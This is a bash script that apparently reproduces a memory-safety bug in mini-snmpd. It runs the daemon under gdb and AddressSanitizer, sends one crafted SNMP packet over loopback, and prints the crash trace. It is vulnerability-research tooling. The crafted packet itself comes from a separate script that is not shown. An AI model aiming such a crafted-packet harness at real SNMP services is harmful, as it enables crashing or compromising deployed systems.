#!/bin/bash
# Plant-started vulnerable mini-snmpd under gdb, one crafted loopback GET.
# No external address, no scan. The inferior is killed by gdb's quit.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
WIRE="$(dirname "$HERE")"
B=mini-snmpd-b532243732609cf7af58ceb1794a0adfe8deeff1
PORT=16171
cd "$WIRE" || exit 99
python3 mkpkt.py "$HERE/crafted.bin" || exit 98

rm -f "$HERE"/gdb.out "$HERE"/asan.* "$HERE"/daemon.out
( cd "$WIRE/$B" || exit 98
  exec timeout 45 env ASAN_OPTIONS=abort_on_error=0:detect_leaks=0:log_path="$HERE/asan" \
       gdb -q -batch -x "$HERE/cmd.gdb" \
       --args ./mini-snmpd -n -p "$PORT" -l debug
) > "$HERE/gdb.out" 2>&1 &
gdbpid=$!
sleep 3
python3 - "$PORT" "$HERE/crafted.bin" <<'PY'
import socket, sys
data = open(sys.argv[2], "rb").read()
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(data, ("127.0.0.1", int(sys.argv[1])))
print(f"WIRE_SENT_BYTES={len(data)} DEST=127.0.0.1:{sys.argv[1]}")
PY
wait "$gdbpid"
rc=$?
printf 'GDB_RC=%s\n' "$rc"
printf -- '--- gdb.out (cap dump + OOB trace) ---\n'
cat "$HERE/gdb.out"
printf -- '--- asan logs ---\n'
for f in "$HERE"/asan.*; do
    [ -f "$f" ] || continue
    printf -- '--- %s ---\n' "$(basename "$f")"
    head -40 "$f"
done
